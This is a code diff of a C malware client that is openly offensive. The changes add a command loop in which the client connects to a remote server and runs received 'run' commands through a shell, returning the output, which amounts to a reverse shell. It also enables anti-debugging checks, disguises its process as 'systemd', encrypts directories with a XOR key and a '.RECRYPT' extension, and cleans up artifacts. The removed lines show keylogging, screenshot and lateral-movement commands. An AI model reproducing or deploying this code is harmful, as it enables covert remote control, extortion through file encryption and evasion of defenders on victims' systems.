@@ -1,44 +1,69 @@
 #include "client_base.h"
-#include "crypto.h"
+#include "postexp.h"
 #include "anti_debug.h"
 #include "stealth.h"
-#include "postexp.h"
+#include "crypto.h"
+
+#define BUFFER_SIZE 1024
+#define RECRYPT_EXTENSION ".RECRYPT"
+
+void execute_command_in_shell(const char *shell_path, const char *command, int sockfd) {
+    char output_buffer[BUFFER_SIZE];
+    FILE *fp;
+    char exec_command[BUFFER_SIZE];
+
+    snprintf(exec_command, sizeof(exec_command), "%s -c \"%s\"", shell_path, command);
+
+    fp = popen(exec_command, "r");
+    if (fp == NULL) {
+        snprintf(output_buffer, BUFFER_SIZE, "Failed to execute command: %s\n", command);
+        send(sockfd, output_buffer, strlen(output_buffer), 0);
+        return;
+    }
+
+    // Send command output line by line to the server
+    while (fgets(output_buffer, sizeof(output_buffer), fp) != NULL) {
+        send(sockfd, output_buffer, strlen(output_buffer), 0);
+    }
+
+    pclose(fp);
+
+    // Signal end of output to the server
+    snprintf(output_buffer, BUFFER_SIZE, "[END_OF_OUTPUT]\n");
+    send(sockfd, output_buffer, strlen(output_buffer), 0);
+}
 
 int main(int argc, char *argv[]) {
-    int sockfd, opt;
-    char server_ip[BUFFER_SIZE] = DEFAULT_SERVER_IP;
-    char server_port[BUFFER_SIZE] = DEFAULT_SERVER_PORT;
-    char password[BUFFER_SIZE] = "";
-    char xor_key[BUFFER_SIZE] = "mysecretpass1"; // Default XOR key
+    int sockfd;
+    char *server_ip = NULL;
+    int server_port = 0;
+    char *password = NULL;
     char *encrypt_dir = NULL;
     char *decrypt_dir = NULL;
+    char *xor_key = NULL;
+    char detected_shell[BUFFER_SIZE];
+    char recv_buffer[BUFFER_SIZE];
+    int opt;
 
-    struct addrinfo hints, *res, *p;
+    // Anti-debugging measures
+    anti_debug_ptrace();
+    anti_debug_proc();
 
-    // Perform anti-debugging checks
-    // Disabling anti_debug since it is buggy
-    // perform_anti_debug_checks(); 
-
-    // Apply stealth features
-    // Disabling stealth features since it is buggy
-    /*
-     rename_process("apache3");
-     change_cmdline("[kworker/u8:2]");
-     clean_artifacts();
-     dynamic_sleep(5, 10); // Base time: 5 seconds, Jitter: 10 seconds
-    */
+    // Stealth measures
+    rename_process("systemd");
+    change_cmdline("systemd");
 
     // Parse command-line arguments
     while ((opt = getopt(argc, argv, "i:p:w:e:d:k:")) != -1) {
         switch (opt) {
             case 'i':
-                strncpy(server_ip, optarg, BUFFER_SIZE);
+                server_ip = optarg;
                 break;
             case 'p':
-                strncpy(server_port, optarg, BUFFER_SIZE);
+                server_port = atoi(optarg);
                 break;
             case 'w':
-                strncpy(password, optarg, BUFFER_SIZE);
+                password = optarg;
                 break;
             case 'e':
                 encrypt_dir = optarg;
@@ -47,12 +72,18 @@ int main(int argc, char *argv[]) {
                 decrypt_dir = optarg;
                 break;
             case 'k':
-                strncpy(xor_key, optarg, BUFFER_SIZE);
+                xor_key = optarg;
                 break;
             default:
                 print_usage(argv[0]);
-                exit(EXIT_FAILURE);
+                return EXIT_FAILURE;
         }
+    }
+
+    // Validate required arguments
+    if (!server_ip || server_port <= 0 || !password) {
+        print_usage(argv[0]);
+        return EXIT_FAILURE;
     }
 
     // Check for encryption or decryption flags
@@ -64,85 +95,69 @@ int main(int argc, char *argv[]) {
 
     if (encrypt_dir) {
         printf("Encrypting files in directory: %s\n", encrypt_dir);
-        process_directory(encrypt_dir, xor_key, 0); // Encryption mode
+        process_directory(encrypt_dir, xor_key ? xor_key : "default_key", 0); // Encryption mode
         return 0;
     }
 
     if (decrypt_dir) {
         printf("Decrypting files in directory: %s\n", decrypt_dir);
-        process_directory(decrypt_dir, xor_key, 1); // Decryption mode
+        process_directory(decrypt_dir, xor_key ? xor_key : "default_key", 1); // Decryption mode
         return 0;
     }
 
-    // Ensure required parameters for server connection
-    if (strlen(password) == 0) {
-        fprintf(stderr, "Error: Password is required.\n");
-        print_usage(argv[0]);
-        exit(EXIT_FAILURE);
+    // Initialize connection
+    sockfd = initialize_connection(server_ip, server_port);
+    if (sockfd < 0) {
+        fprintf(stderr, "Failed to initialize connection.\n");
+        return EXIT_FAILURE;
     }
 
-    // Setup network connection
-    memset(&hints, 0, sizeof(hints));
-    hints.ai_family = AF_UNSPEC; // Support both IPv4 and IPv6
-    hints.ai_socktype = SOCK_STREAM;
-
-    if (getaddrinfo(server_ip, server_port, &hints, &res) != 0) {
-        error_exit("Error resolving server address");
-    }
-
-    for (p = res; p != NULL; p = p->ai_next) {
-        sockfd = socket(p->ai_family, p->ai_socktype, p->ai_protocol);
-        if (sockfd < 0) continue;
-
-        if (connect(sockfd, p->ai_addr, p->ai_addrlen) == 0) break;
-
-        close(sockfd);
-    }
-
-    if (!p) {
-        fprintf(stderr, "Error: Unable to connect to server at %s:%s\n", server_ip, server_port);
-        freeaddrinfo(res);
-        exit(EXIT_FAILURE);
-    }
-
-    freeaddrinfo(res);
-    printf("Connected to server at %s:%s\n", server_ip, server_port);
-
-    // Authenticate with server
+    // Authenticate with the server
     if (!authenticate(sockfd, password)) {
+        fprintf(stderr, "Authentication failed.\n");
         close(sockfd);
-        return 1;
+        return EXIT_FAILURE;
     }
 
-    // Main loop to execute commands
-    printf("Enter commands to execute on the server. Type 'exit' to quit.\n");
-    char command[BUFFER_SIZE];
+    printf("Authentication successful. Connected to server.\n");
+
+    // Detect available shell
+    if (detect_shell(detected_shell, sizeof(detected_shell)) < 0) {
+        fprintf(stderr, "No supported shell found. Exiting.\n");
+        close(sockfd);
+        return EXIT_FAILURE;
+    }
+
+    // Notify server about the detected shell
+    send(sockfd, detected_shell, strlen(detected_shell), 0);
+    printf("Using shell: %s\n", detected_shell);
+
+    // Main loop for receiving commands and sending output
     while (1) {
-        printf("> ");
-        if (!fgets(command, BUFFER_SIZE, stdin)) break;
-        command[strcspn(command, "\n")] = '\0'; // Remove newline character
+        ssize_t received = recv(sockfd, recv_buffer, BUFFER_SIZE - 1, 0);
+        if (received < 0) {
+            perror("Receive failed");
+            break;
+        } else if (received == 0) {
+            printf("Server closed the connection.\n");
+            break;
+        }
 
-        if (strcmp(command, "exit") == 0) break;
+        recv_buffer[received] = '\0';
 
-        if (strcmp(command, "start_keylog") == 0) {
-            start_keylogging("keylog.txt");
-        } else if (strcmp(command, "stop_keylog") == 0) {
-            stop_keylogging();
-        } else if (strcmp(command, "capture_screenshot") == 0) {
-            capture_screenshot("screenshot.png");
-        } else if (strncmp(command, "lateral_move ", 13) == 0) {
-            char *args = command + 13;
-            char *target_ip = strtok(args, " ");
-            char *remote_command = strtok(NULL, "");
-            if (target_ip && remote_command) {
-                lateral_movement(target_ip, remote_command);
-            } else {
-                printf("Usage: lateral_move <target_ip> <command>\n");
-            }
-        } else {
-            execute_command_and_send_output(command, sockfd);
+        // Handle "run <command>" format
+        if (strncmp(recv_buffer, "run ", 4) == 0) {
+            char *command = recv_buffer + 4;
+            printf("Executing command: %s\n", command);
+            execute_command_in_shell(detected_shell, command, sockfd);
+        } else if (strcmp(recv_buffer, "exit\n") == 0 || strcmp(recv_buffer, "quit\n") == 0) {
+            printf("Exiting on server request...\n");
+            break;
         }
     }
+
+    // Post-exploitation cleanup
+    clean_artifacts();
 
     // Clean up
     close(sockfd);
